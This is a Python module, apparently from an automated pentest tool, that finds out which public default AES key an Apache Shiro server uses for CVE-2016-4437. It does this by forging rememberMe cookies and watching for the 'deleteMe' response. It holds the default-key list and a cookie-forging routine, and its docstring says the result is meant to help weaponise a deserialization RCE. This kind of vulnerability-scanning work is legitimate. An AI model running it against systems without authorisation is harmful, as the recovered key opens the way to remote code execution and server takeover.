"""Apache Shiro-550 default-key oracle (CVE-2016-4437) — safe key RECOVERY, no exploitation.

Shiro's ``rememberMe`` cookie is ``base64(IV || AES-CBC(key, java-serialized-principals))``.
When the AES key is a shipped/leaked default, an attacker forges a cookie that deserializes
a gadget chain → pre-auth RCE. This module RECOVERS which default key is in use, safely:

* forge a ``rememberMe`` that is the default-key encryption of a **benign**
  ``SimplePrincipalCollection`` (a harmless object — no gadget, no side effect);
* the WRONG key → AES/padding/deserialize failure → Shiro answers ``Set-Cookie:
  rememberMe=deleteMe``; the RIGHT key → clean deserialize → **no** ``deleteMe``.

So the default key whose cookie does *not* trigger ``deleteMe`` is the one in use — reported
so the human/Strix can weaponise the gadget chain. A garbage-key negative control guards
against an endpoint that stopped emitting the tell. The benign check object and the public
default-key list are the same ones every open-source Shiro scanner uses (detection data,
like a nuclei template) — nothing is exploited here.

Sources: FreeBuf / Seebug / AnQuanKe (CN); github.com/j1anFen/shiro_attack ; the Shiro
``AesCipherService`` default (CBC + PKCS7, IV-prefixed). See docs/RESEARCH_GAPS.md Theme 4.
"""

from __future__ import annotations

import base64
import os
from collections.abc import Awaitable, Callable

# A benign, minimal serialized org.apache.shiro.subject.SimplePrincipalCollection (null
# realmPrincipals). Deserialises to a harmless object — the standard key-check payload.
CHECK_BLOB = base64.b64decode(
    "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqhfMTgt"
    "5+MQAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==")

# Public, shipped/leaked default AES-128 keys (base64). The same list open-source Shiro
# scanners carry — detection data, not exploits.
DEFAULT_KEYS: list[str] = [
    "kPH+bIxk5D2deZiIxcaaaA==", "4AvVhmFLUs0KTA3Kprsdag==", "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==", "0AvVhmFLUs0KTA3Kprsdag==", "1AvVhdsgUs0FSA3SDFAdag==",
    "1QWLxg+NYmxraMoxAXu/Iw==", "25BsmdYwjnfcWmnhAciDDg==", "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==", "3JvYhmBLUs0ETA5Kprsdag==", "r0e3c16IdVkouZgk1TKVMg==",
    "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "cmVtZW1iZXJNZQAAAAAAAA==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==", "wGiHplamyXlVB11UXWol8g==", "U3ByaW5nQmxhZGUAAAAAAA==",
    "MTIzNDU2Nzg5MGFiY2RlZg==", "bWluZS1hc3NldC1rZXk6QQ==",
    "WcfHGU25gNnTxTlmJMeSpw==", "OUHYQzxQ/W9e/UjiAGu6rg==", "e0OA34PkcuxGXf/6D/23gg==",
    "3qDVdLawoIr1xFd6ietnwg==",
]
# The negative control: an all-zero key no real deployment uses — its cookie MUST still
# trip deleteMe, proving the endpoint reliably emits the tell before we trust a match.
_GARBAGE_KEY = base64.b64encode(b"\x00" * 16).decode()


def remember_me_cookie(key_b64: str, blob: bytes = CHECK_BLOB) -> str:
    """Forge a Shiro ``rememberMe`` value = ``base64(IV || AES-CBC-PKCS7(key, blob))``."""

    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.padding import PKCS7

    key = base64.b64decode(key_b64)
    iv = os.urandom(16)
    padder = PKCS7(128).padder()
    padded = padder.update(blob) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(padded) + enc.finalize()
    return base64.b64encode(iv + ct).decode()


async def recover_key(deletes_cookie: Callable[[str], Awaitable[bool]]) -> str | None:
    """Return the in-use default key, or None. *deletes_cookie(value)* sends a ``rememberMe``
    and returns True iff the response set ``rememberMe=deleteMe`` (a rejected cookie). The
    default key whose benign-blob cookie is NOT rejected is the one in use — confirmed only
    when a garbage-key cookie of the same shape IS still rejected (the tell is live)."""

    for key in DEFAULT_KEYS:
        try:
            cookie = remember_me_cookie(key)
        except Exception:  # noqa: BLE001 - a malformed key in the list must not abort the sweep
            continue
        if not await deletes_cookie(cookie):                 # candidate: not rejected
            try:
                control = remember_me_cookie(_GARBAGE_KEY)
            except Exception:  # noqa: BLE001
                return None
            if await deletes_cookie(control):                # the tell is live → trust the match
                return key
            return None                                      # endpoint unreliable → inconclusive
    return None
